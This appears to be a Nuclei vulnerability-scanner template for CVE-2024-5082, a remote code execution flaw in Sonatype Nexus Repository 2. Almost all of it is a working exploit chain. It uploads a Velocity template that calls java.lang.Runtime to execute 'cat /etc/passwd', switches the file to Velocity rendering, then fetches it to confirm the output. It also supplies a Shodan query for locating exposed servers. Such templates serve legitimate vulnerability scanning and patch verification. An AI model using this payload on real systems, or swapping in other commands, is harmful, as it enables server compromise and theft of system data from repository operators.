flow: http(1) && http(2) && http(3)
http:
- matchers:
  - internal: true
    status:
    - 201
    type: status
  raw:
  - 'PUT /nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml
    HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    Authorization: Basic {{base64(credentials)}}

    Content-type: text/xml


    #set($engine="")

    #set($run=$engine.getClass().forName("java.lang.Runtime"))

    #set($runtime=$run.getRuntime())

    #set($proc=$runtime.exec("cat /etc/passwd"))

    #set($null=$proc.waitFor())

    #set($istr=$proc.getInputStream())

    #set($chr=$engine.getClass().forName("java.lang.Character"))

    #set($output="")

    #set($string=$engine.getClass().forName("java.lang.String"))

    #foreach($i in [1..$istr.available()])

    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))

    #end

    $output

    '
- matchers:
  - internal: true
    status:
    - 201
    type: status
  raw:
  - 'PUT /nexus/service/local/repositories/releases/content//.nexus/attributes/com/sbt/ignite/ignite-bom/maven-metadata.xml
    HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(credentials)}}

    Content-type: application/json


    {"contentGenerator":"velocity"}

    '
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: content_type
    type: word
    words:
    - text/plain
  matchers-condition: and
  raw:
  - 'GET /nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml
    HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(credentials)}}

    '
id: CVE-2024-5082
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    epss-percentile: 0.92292
    epss-score: 0.08914
  description: 'A Remote Code Execution vulnerability has been discovered in Sonatype
    Nexus Repository 2.This issue affects Nexus Repository 2 OSS/Pro versions up to
    and including 2.15.1.

    '
  impact: 'Attackers can exploit vulnerabilities to compromise the system.

    '
  metadata:
    max-request: 3
    shodan-query: html:"Nexus Repository"
    verified: true
  name: Nexus Repository 2 - Remote Code Execution
  reference:
  - https://github.blog/security/vulnerability-research/attacks-on-maven-proxy-repositories/
  - https://support.sonatype.com/hc/en-us/articles/30694125380755
  remediation: 'Update to the latest patched version addressing CVE-2024-5082.

    '
  severity: high
  tags: cve,cve2024,intrusive,nexus,sonartype,vkev,vuln
variables:
  credentials: '{{ username + '':'' + password }}'
  password: '{{password}}'
  username: '{{username}}'
